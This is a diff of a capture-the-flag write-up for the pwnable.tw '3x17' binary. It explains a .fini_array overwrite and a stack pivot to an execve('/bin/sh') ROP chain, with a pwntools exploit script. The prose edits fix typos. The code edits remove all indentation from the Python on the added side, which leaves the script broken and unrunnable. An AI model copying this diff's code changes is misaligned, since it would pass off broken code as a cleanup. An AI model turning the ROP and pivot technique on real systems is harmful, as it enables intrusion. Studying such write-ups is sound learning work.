@@ -12,9 +12,9 @@ the stripped function `sub_40EE80` is just `strtoll` (you can test it via inputs
 
 it's quite obvious that `0x18` bytes doesn't fit our `execve` ROP, and we need to write `/bin/sh` somewhere too, so we need to loop this _write-what-where_ sequence until we can execute our ROP chain
 
-the challenge name `3x17` is just "exit" in leetspeak, giving us a hint about the exit of the program. doing further researchs about program exit routine, we found two interesting elf sections: `.fini` and `.fini_array`
+the challenge name `3x17` is just "exit" in leetspeak, giving us a hint about the exit of the program. doing further research on the program exit routine, we found two interesting elf sections: `.fini` and `.fini_array`
 
-these sections contains pointers to cleanup functions, global destructors and unregistration routines executed automatically just before the application terminates. when a program terminates, wheter by returning from `main()` or callin `exit()`, the dynamic linker/loader `ld.so` and `glibc` executes these routines in this specific order:
+these sections contain pointers to cleanup functions, global destructors and unregistration routines executed automatically just before the application terminates. when a program terminates, whether by returning from `main()` or calling `exit()`, the dynamic linker/loader `ld.so` and `glibc` execute these routines in this specific order:
 1.  `__cxa_atexit()`: handles object destructors and functions registered by the user at runtime
 2.  `FINI_ARRAY`: iterates through an array of function pointers in the `.fini_array` and executes them in **reverse order** of how they were initialized
 3.  `_fini`: calls legacy cleanup code stored inside the `.fini` section
@@ -23,23 +23,24 @@ these sections contains pointers to cleanup functions, global destructors and un
 
 ![readelf output](./prints/readelf.png)
 
-if you look carefully, you'll see that `.fini` section isn't writable (marked with **W**), but `.fini_array` is!!
+if you look carefully, you'll see that `.fini` section isn't writable (marked without **W**), but `.fini_array` is!!
 
 ![fini_array](./prints/fini_array.png)
 - `.fini_array` address: `0x004b40f0`
 - `.fini_array` entry0 (first 8 bytes): `0x0000000000401b00`
 - `.fini_array` entry1 (last 8 bytes): `0x0000000000401580`
 
-now the path is pretty straight forward: abuse the `.fini_array` section with our _write-what-where_ primitive, write our payload somewhere in our binary (probably `.bss`) and stack pivot to there
+now the path is pretty straight forward: abuse the `.fini_array` section with our _write-what-where_ primitive, write our payload somewhere in our binary (probably `.bss`) and stack pivot there
 
-theres a tiny detail about this, that being the comparation that the `main()` does before letting us play 
+there's a tiny detail about this, that being the comparison that `main()` does before letting us play 
 ![main comparation](./prints/cmp.png)
 
-we can ignore this, because it is treating the value at `cs:byte_4B9330` as an `unsigned byte`, so it'll keep incrementing until it wraps around, returning it's value to `1` and executing our primitive. 
+we can ignore this, because it is treating the value at `cs:byte_4B9330` as an `unsigned byte`, so it'll keep incrementing until it wraps around, returning its value to `1` and executing our primitive. 
 
-another detail is that the function pointers in `.fini_array` are executed in reverse order, we need to put our main furthest in this section (it's at offset `0x08`). we need to find anoter crucial address to overwrite `entry0`, because when it executes there, the routine will see that he executed all functions from `.fini_array` and will exit. we will use te routine address itself, to keep it on a loop xD
+another detail is that the function pointers in `.fini_array` are executed in reverse order, we need to put our main furthest in this section (it's at offset `0x08`). we need to find another crucial address to overwrite `entry0`, because when it executes there, the routine will see that it executed all functions from `.fini_array` and will exit. we will use the routine address itself, to keep it on a loop xD
 
-let's see what our layout look like:
+let's see what our layout looks like:
+
 ```
 0x0000000000401c4b : leave ; ret
 0x0000000000402ba9 : pop rsp ; ret
@@ -89,73 +90,72 @@ context.terminal = "kitty @ launch --location=vsplit --cwd=current".split()
 context.log_level = 'debug'
 
 def conn():
-    if args.REMOTE:
-        p = remote("chall.pwnable.tw", 10105)
-    else:
-        if args.GDB:
-            p = gdb.debug([elf.path], aslr=True, api=False, gdbscript="""
-                b *0x401b6d
-                """)
-        else:
-            p = process([elf.path])
+if args.REMOTE:
+p = remote("chall.pwnable.tw", 10105)
+else:
+if args.GDB:
+p = gdb.debug([elf.path], aslr=True, api=False, gdbscript="""
+b *0x401b6d
+""")
+else:
+p = process([elf.path])
 
-    return p
+return p
 
 def write_payload(p, address, data):
-    for i in range(0, len(data), 24):
-        chunk = data[i:i+24]
-        real_addr = address + i
+for i in range(0, len(data), 24):
+chunk = data[i:i+24]
+real_addr = address + i
 
-        p.sendafter(b"addr:", str(real_addr).encode())
-        p.sendafter(b"data:", chunk)
+p.sendafter(b"addr:", str(real_addr).encode())
+p.sendafter(b"data:", chunk)
 
 def main():
-    p = conn()
+p = conn()
 
-    # pwn it
-    leave_ret = 0x0000000000401c4b # leave ; ret
-    pop_rsp = 0x0000000000402ba9 # pop rsp ; ret
-    pop_rsi = 0x0000000000406c30 # pop rsi ; ret
-    pop_rdi = 0x0000000000401696 # pop rdi ; ret
-    pop_rdx = 0x0000000000446e35 # pop rdx ; ret
-    pop_rax = 0x000000000041e4af # pop rax ; ret
-    syscall = 0x00000000004022b4 # syscall
-    main = 0x0000000000401B6D
+# pwn it
+leave_ret = 0x0000000000401c4b # leave ; ret
+pop_rsp = 0x0000000000402ba9 # pop rsp ; ret
+pop_rsi = 0x0000000000406c30 # pop rsi ; ret
+pop_rdi = 0x0000000000401696 # pop rdi ; ret
+pop_rdx = 0x0000000000446e35 # pop rdx ; ret
+pop_rax = 0x000000000041e4af # pop rax ; ret
+syscall = 0x00000000004022b4 # syscall
+main = 0x0000000000401B6D
 
-    fini_array = 0x004b40f0
-    destructor_routine = 0x402960
+fini_array = 0x004b40f0
+destructor_routine = 0x402960
 
-    payload = p64(destructor_routine) 
-    payload += p64(main)
+payload = p64(destructor_routine) 
+payload += p64(main)
 
-    write_payload(p, fini_array, payload)
-    
-    target = elf.bss()
+write_payload(p, fini_array, payload)
 
-    write_payload(p, target, b"/bin/sh\x00".ljust(24, b"\x00"))
+target = elf.bss()
 
-    target += 8
-    
-    payload = p64(pop_rdi)
-    payload += p64(elf.bss())
-    payload += p64(pop_rsi)
-    payload += p64(0)
-    payload += p64(pop_rdx)
-    payload += p64(0)
-    payload += p64(pop_rax)
-    payload += p64(59)
-    payload += p64(syscall)
+write_payload(p, target, b"/bin/sh\x00".ljust(24, b"\x00"))
 
-    write_payload(p, target, payload)
+target += 8
 
-    payload = p64(leave_ret)
-    payload += p64(pop_rsp)
-    payload += p64(target)
+payload = p64(pop_rdi)
+payload += p64(elf.bss())
+payload += p64(pop_rsi)
+payload += p64(0)
+payload += p64(pop_rdx)
+payload += p64(0)
+payload += p64(pop_rax)
+payload += p64(59)
+payload += p64(syscall)
 
-    write_payload(p, fini_array, payload)
+write_payload(p, target, payload)
 
-    p.interactive()
+payload = p64(leave_ret)
+payload += p64(pop_rsp)
+payload += p64(target)
+
+write_payload(p, fini_array, payload)
+
+p.interactive()
 
 if __name__ == '__main__':
-    main()
-```
+main()
